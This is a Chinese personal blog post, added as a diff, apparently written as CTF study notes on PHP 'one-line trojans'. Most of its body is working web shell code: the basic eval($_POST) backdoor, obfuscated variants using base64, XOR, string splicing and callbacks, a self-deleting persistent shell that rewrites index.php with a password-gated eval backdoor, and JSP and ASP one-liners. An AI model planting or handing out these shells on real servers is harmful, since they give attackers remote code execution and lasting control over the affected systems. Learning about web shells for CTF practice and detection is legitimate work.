@@ -1,0 +1,448 @@
+<head>
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+<script src="https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget/autoload.js"></script>
+</head>
+
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+<head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="ggy的个人博客">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.2.3">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="https://ggyggy666.github.io">
+    <!--SEO-->
+
+<meta name="keywords" content="涅普CTF入门-一句话木马" />
+
+
+<meta name="description" content="今天学习web的一句话木马。
+条件
+木马能上传到服务器。
+上传后能保留并被解析执行。
+知道上传后的路径。
+
+eval和assertassert在PHP7.1之后被废弃了。eval不能被可变函数调..." />
+
+
+<meta name="robots" content="all" />
+<meta name="google" content="all" />
+<meta name="googlebot" content="all" />
+<meta name="verify" content="all" />
+    <!--Title-->
+
+<title>
+    
+    涅普CTF入门-一句话木马 |
+    
+    ggy的个人博客
+</title>
+
+<link rel="alternate" href="/atom.xml" title="ggy的个人博客" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+<div class="hide">
+    <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+    document.write(unescape("%3Cspan class='cnzz_stat_icon_1263868967 hide' %3E%3Cscript%20src%3D%22https%3A%2F%2Fs95.cnzz.com%2Fz_stat.php%3Fweb_id%3D1272564536%22%3E%3C%2Fscript%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s19.cnzz.com/z_stat.php%3Fid%3D1263868967%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script>
+</div>
+
+
+
+
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header"  style="background-image:url(
+    https://pic.downk.cc/item/5e3816b82fb38b8c3c8791f9.jpg)"
+     >
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title='ggy'>
+            <img src="/img/avatar.jpg" alt="logo头像" class="img-responsive center-block">
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">Snippet主题,从未如此简单有趣</h2>-->
+            
+            <h2>
+                欢迎来到ggy的个人网站
+            </h2>
+            
+        </div>
+    </div>
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="https://ggyggy666.github.io">
+                        ggy的个人博客</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                首页</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/web安全/"><i class="fa "></i>
+                                web安全</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/python工具/"><i class="fa "></i>
+                                python工具</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/密码学/"><i class="fa "></i>
+                                密码学</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                时间轴</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="涅普CTF入门-一句话木马">
+            
+            涅普CTF入门-一句话木马
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/CTF%E5%85%A5%E9%97%A8/">CTF入门</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-link" href="/tags/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" rel="tag">涅普CTF入门-一句话木马</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2021/02/20</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p>今天学习web的一句话木马。</p>
+<h1 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h1><ol>
+<li>木马能上传到服务器。</li>
+<li>上传后能保留并被解析执行。</li>
+<li>知道上传后的路径。</li>
+</ol>
+<h1 id="eval和assert"><a href="#eval和assert" class="headerlink" title="eval和assert"></a>eval和assert</h1><p>assert在PHP7.1之后被废弃了。eval不能被可变函数调用，比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	$a &#x3D; &quot;eval&quot;;</span><br><span class="line">	@$a(@$_GET[&#39;x&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="有-和无-的区别"><a href="#有-和无-的区别" class="headerlink" title="有@和无@的区别"></a>有@和无@的区别</h1><p>有@不会显示报错，没有就会显示。比如assert，PHP&gt;7.1之后就废弃了，继续使用会报错，如果用了@</p>
+<p><img src="/2021/02/20/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210220185750212.png" alt="image-20210220185750212"></p>
+<p>页面一片空白。没有使用@,</p>
+<p><img src="/2021/02/20/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210220185843443.png" alt="image-20210220185843443"></p>
+<p>直接报错。</p>
+<h1 id="一句话木马及变种"><a href="#一句话木马及变种" class="headerlink" title="一句话木马及变种"></a>一句话木马及变种</h1><h2 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;	&#x2F;&#x2F;用蚁剑连，密码是cmd</span><br><span class="line">&lt;?php @eval(&quot;phpinfo();&quot;);?&gt;	&#x2F;&#x2F;PHP探针</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是，使用蚁剑连的话需要使用$_POST, 使用$_GET是不行的。$_REQUEST也是可以的。</p>
+<h2 id="使用JS代码"><a href="#使用JS代码" class="headerlink" title="使用JS代码"></a>使用JS代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这个在PHPStudy的环境没有解析成功?</p>
+<h2 id="拆分拼接"><a href="#拆分拼接" class="headerlink" title="拆分拼接"></a>拆分拼接</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$arr &#x3D; explode(&quot;,&quot;,&quot;a,s,d,f,s,d,e,k,r,t&quot;);</span><br><span class="line">	$payload &#x3D; $arr[0].$arr[1].$arr[4].$arr[6].$arr[8].$arr[9];</span><br><span class="line">	@$payload(@$_GET[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>PHP版本需要小于7.1才能拼接assert, 而拼接eval是不行的。</p>
+<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a &#x3D; base64_decode(&quot;YXNzZXJ0&quot;);</span><br><span class="line">	$a($_POST[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>同样PHP&lt;7.1。</p>
+<h2 id="随机异或"><a href="#随机异或" class="headerlink" title="随机异或"></a>随机异或</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    &#x2F;&#x2F;也可以用十六进制进行进一步加密,例如</span><br><span class="line">    &#x2F;&#x2F;$r&#x3D;&quot;x4d&quot;^&quot;x3f&quot;;</span><br><span class="line">    $a&#x3D;&quot;Y&quot;^&quot;8&quot;;&#x2F;&#x2F;a</span><br><span class="line">    $b&#x3D;&quot;T&quot;^&quot;&#39;&quot;;&#x2F;&#x2F;s</span><br><span class="line">    $c&#x3D;&quot;*&quot;^&quot;O&quot;;&#x2F;&#x2F;e</span><br><span class="line">    $d&#x3D;&quot;M&quot;^&quot;?&quot;;&#x2F;&#x2F;r</span><br><span class="line">    $e&#x3D;&quot;-&quot;^&quot;Y&quot;;&#x2F;&#x2F;t</span><br><span class="line">    $payload&#x3D;$a.$b.$b.$c.$d.$e;&#x2F;&#x2F;拼接成assert</span><br><span class="line">    @$payload(@$_POST[&#39;x&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $a&#x3D;&#39;assert&#39;;</span><br><span class="line">    $b&#x3D;&#39;a&#39;;</span><br><span class="line">    &#x2F;&#x2F;$$b&#x3D;$a&#x3D;&#39;assert&#39;</span><br><span class="line">    $$b($_POST[&#39;x&#39;]); &#x2F;&#x2F;assert($_POST[&#39;x&#39;])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="可变函数"><a href="#可变函数" class="headerlink" title="可变函数"></a>可变函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@$_REQUEST[&#39;e&#39;](@$_REQUEST[&#39;x&#39;]);</span><br><span class="line">&#x2F;&#x2F;传入e&#x3D;assert&amp;x&#x3D;command</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用回调函数"><a href="#使用回调函数" class="headerlink" title="使用回调函数"></a>使用回调函数</h2><p>使用到：<code>call_user_func($callback, $parameter)</code>，$callback是回调函数名称，parameter是参数。使用方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"> @call_user_func($_GET[&#39;id&#39;],$_GET[&#39;a&#39;]);</span><br><span class="line"> &#x2F;&#x2F;传入id&#x3D;eval&amp;a&#x3D;command</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/02/20/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210220191447775.png" alt="image-20210220191447775"></p>
+<p>报错了？？</p>
+<h2 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ignore_user_abort(true);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">unlink(__FILE__);</span><br><span class="line">$file &#x3D; &#39;.&#x2F;index.php&#39;;</span><br><span class="line">$code &#x3D; &#39;&lt;?php if($_GET[&quot;pass&quot;]&#x3D;&#x3D;&quot;ggy&quot;)&#123;@eval($_GET[&quot;cmd&quot;]);&#125; ?&gt;&#39;;</span><br><span class="line">&#x2F;&#x2F;pass&#x3D;nepnep 用法：pass&#x3D;nepnep&amp;cmd&#x3D;command</span><br><span class="line">	file_put_contents($file,$code);</span><br><span class="line">	usleep(5000);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>ignore_user_abort(true): 设置成true，断开连接仍然执行一句话。</li>
+<li>set_time_limit(0): 0表示没有限制。</li>
+<li><code>unlink(__FILE__)</code>:  删除文件自身。</li>
+<li>usleep(): 延迟执行当前脚本。</li>
+</ul>
+<p><img src="/2021/02/20/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210220191950219.png" alt="image-20210220191950219"></p>
+<p>崩了。。</p>
+<p>之后访问:<code>xxx/index.php?pass=ggy&amp;cmd=phpinfo();</code>即可。</p>
+<h2 id="利用函数和类"><a href="#利用函数和类" class="headerlink" title="利用函数和类"></a>利用函数和类</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	function ggy($a)&#123;</span><br><span class="line">	assert($a);</span><br><span class="line">	&#125;</span><br><span class="line">	@ggy($_POST[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class ggy&#123;</span><br><span class="line">		public $a&#x3D;&#39;&#39;;</span><br><span class="line">		function __destruct()&#123;</span><br><span class="line">			assert(&quot;this-&gt;$a&quot;);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		$b&#x3D;new ggy();</span><br><span class="line">		$b-&gt;a&#x3D;$_POST[&#39;cmd&#39;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	if(isset($_GET[&#39;filename&#39;]))</span><br><span class="line">	&#123;</span><br><span class="line">		$d&#x3D;&#39;data&#39;;</span><br><span class="line">		$$d&#x3D;$_GET[&#39;text&#39;];  &#x2F;&#x2F;$data</span><br><span class="line">		$f&#x3D;&#39;fp&#39;;</span><br><span class="line">		$$f&#x3D;fopen($_GET[&#39;filename&#39;],&#39;wb&#39;);  &#x2F;&#x2F;$fp</span><br><span class="line">		echo fwrite($fp,$data)?&quot;save success&quot;:&quot;save fail&quot;;</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问：<code>/word1.php?filename=ggy.php&amp;text=&lt;?%20phpinfo();?&gt;</code>, 在目录下生成ggy.php。访问即可。</p>
+<h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @preg_replace(&quot;&#x2F;abcd&#x2F;e&quot;,$_GET[&#39;a&#39;],&quot;abcdefg&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>PHP新版本不支持了。用的是preg_replace_callback()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function test()&#123;</span><br><span class="line">	eval($_GET[&#39;cmd&#39;]);</span><br><span class="line">&#125;</span><br><span class="line">preg_replace_callback(&quot;&#x2F;abcd&#x2F;&quot;,test,&quot;abcde&quot;); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>匹配到就调用test。访问:<code>xxx.php?cmd=phpinfo();</code></p>
+<h2 id="str-replace"><a href="#str-replace" class="headerlink" title="str_replace"></a>str_replace</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a &#x3D; str_replace(&quot;b&quot;, &quot;&quot;, &quot;absbsbebrbt&quot;);</span><br><span class="line">	$a($_GET[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="pares-str"><a href="#pares-str" class="headerlink" title="pares_str"></a>pares_str</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $str &#x3D; &quot;a&#x3D;assert&quot;;              			    	parse_str($str);</span><br><span class="line">    $a($_POST[&#39;hacker&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="substr-replace"><a href="#substr-replace" class="headerlink" title="substr_replace"></a>substr_replace</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a&#x3D;substr_replace(&quot;assexx&quot;,&quot;rt&quot;,4);</span><br><span class="line">	@$a($_POST[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="短木马"><a href="#短木马" class="headerlink" title="短木马"></a>短木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&#x3D;phpinfo()?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="JSP木马"><a href="#JSP木马" class="headerlink" title="JSP木马"></a>JSP木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;0&quot;));%&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="ASP木马"><a href="#ASP木马" class="headerlink" title="ASP木马"></a>ASP木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%execute(request(&quot;0&quot;))%&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>参考:</p>
+<p><a href="https://blog.csdn.net/weixin_46270220/article/details/113745113" target="_blank" rel="noopener">https://blog.csdn.net/weixin_46270220/article/details/113745113</a></p>
+<p><a href="https://www.cnblogs.com/white-album2/p/9851468.html" target="_blank" rel="noopener">https://www.cnblogs.com/white-album2/p/9851468.html</a></p>
+<p>涅普的PPT</p>
+
+    </div>
+    
+    <div class="reward" ontouchstart>
+    <div class="reward-wrap">赏
+        <div class="reward-box">
+            
+            <span class="reward-type">
+                <img class="alipay" src="/img/alipay.jpg"><b>支付宝打赏</b>
+            </span>
+            
+            
+            <span class="reward-type">
+                <img class="wechat" src="/img/wechat.jpg"><b>微信打赏</b>
+            </span>
+            
+        </div>
+    </div>
+    <p class="reward-tip">
+        赞赏是不耍流氓的鼓励
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="ggy.44pp.vip" target="_blank">ggy</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/2021/03/08/%E8%8E%B7%E5%8F%96%E7%94%B5%E8%84%91%E8%BF%9E%E6%8E%A5%E7%9A%84WiFi%E5%AF%86%E7%A0%81/" class="pre-post btn btn-default" title='获取电脑连接的WiFi密码'>
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            获取电脑连接的WiFi密码</span>
+    </a>
+    
+    
+    <a href="/2021/02/16/%C2%96%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-crypt%EF%BC%88%E4%BA%8C%EF%BC%89/" class="next-post btn btn-default" title='涅普CTF入门-crypt（二）'>
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            涅普CTF入门-crypt（二）</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<div id="lv-container" data-id="city" data-uid="MTAyMC80ODM1Ni8yNDg1MA==">
+    <script type="text/javascript">
+    (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+    })(document, 'script');
+    </script>
+</div>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            文章目录
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#条件"><span class="toc-text">条件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#eval和assert"><span class="toc-text">eval和assert</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#有-和无-的区别"><span class="toc-text">有@和无@的区别</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#一句话木马及变种"><span class="toc-text">一句话木马及变种</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#原型"><span class="toc-text">原型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用JS代码"><span class="toc-text">使用JS代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#拆分拼接"><span class="toc-text">拆分拼接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编码"><span class="toc-text">编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#随机异或"><span class="toc-text">随机异或</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#可变变量"><span class="toc-text">可变变量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#可变函数"><span class="toc-text">可变函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用回调函数"><span class="toc-text">使用回调函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#不死马"><span class="toc-text">不死马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用函数和类"><span class="toc-text">利用函数和类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件写入"><span class="toc-text">文件写入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#preg-replace"><span class="toc-text">preg_replace()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#str-replace"><span class="toc-text">str_replace</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pares-str"><span class="toc-text">pares_str</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#substr-replace"><span class="toc-text">substr_replace</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#短木马"><span class="toc-text">短木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSP木马"><span class="toc-text">JSP木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ASP木马"><span class="toc-text">ASP木马</span></a></li></ol></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    访问量:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    &nbsp; | &nbsp;
+    访客数:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright &copy;
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//hexo.io" class="copyright-links" target="_blank" rel="nofollow">Hexo</a>
+                </span> |
+                <span>
+                    Theme by <a href="//github.com/shenliyang/hexo-theme-snippet.git" class="copyright-links" target="_blank" rel="nofollow">Snippet</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="/assets/tagcanvas.min.js?rev=2.9.js"></script>
+
+<script>
+var tagOption = {
+    textColour: '#444', // 字体颜色
+    outlineMethod: 'block', // 选中模式
+    outlineColour: '#FFDAB9', // 选中模式的颜色
+    interval: 30 || 30, // 动画帧之间的时间间隔，值越大，转动幅度越大
+    textHeight: 13,
+    outlineRadius: 3,
+    freezeActive: true || '', // 选中的标签是否继续滚动
+    frontSelect: true || '', // 不选标签云后部的标签
+    initial: [0.1, -0.1],
+    depth: 0.5,
+    decel: 0.95,
+    maxSpeed: 0.03,
+    reverse: true || '', // 是否反向触发
+    fadeIn: 500, // 进入动画时间
+    wheelZoom: false || '' // 是否启用鼠标滚轮
+}
+TagCanvas.Start('tag-cloud-3d', '', tagOption);
+</script>
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+<!-- 雪花特效 -->
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<script type="text/javascript" src="\js\snow.js"></script>
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
